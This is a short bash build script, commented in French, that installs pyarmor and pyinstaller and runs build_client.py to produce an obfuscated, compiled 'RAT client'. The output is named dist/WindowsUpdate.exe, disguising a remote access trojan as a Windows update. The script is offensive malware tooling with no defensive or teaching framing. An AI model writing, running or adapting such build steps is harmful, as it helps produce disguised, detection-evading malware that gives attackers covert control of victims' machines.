#!/bin/bash
# Script de build rapide pour Linux/Mac

echo "========================================"
echo "BUILD CLIENT RAT - OBFUSQUÉ ET COMPILÉ"
echo "========================================"
echo ""

# Vérifier Python
if ! command -v python3 &> /dev/null; then
    echo "[ERREUR] Python3 n'est pas installé"
    exit 1
fi

echo "[1/4] Installation des dépendances de build..."
pip3 install pyarmor pyinstaller --quiet
if [ $? -ne 0 ]; then
    echo "[ERREUR] Installation des dépendances échouée"
    exit 1
fi

echo "[2/4] Vérification de config.py..."
if [ ! -f "config.py" ]; then
    echo "[ERREUR] config.py introuvable"
    exit 1
fi

echo "[3/4] Lancement du build..."
python3 build_client.py

echo ""
echo "[4/4] Build terminé!"
echo ""

if [ -f "dist/WindowsUpdate.exe" ]; then
    echo "========================================"
    echo "✅ BUILD RÉUSSI!"
    echo "========================================"
    echo ""
    echo "Exécutable: dist/WindowsUpdate.exe"
    size=$(du -h "dist/WindowsUpdate.exe" | cut -f1)
    echo "Taille: $size"
    echo ""
else
    echo "[ERREUR] L'exécutable n'a pas été créé"
    exit 1
fi
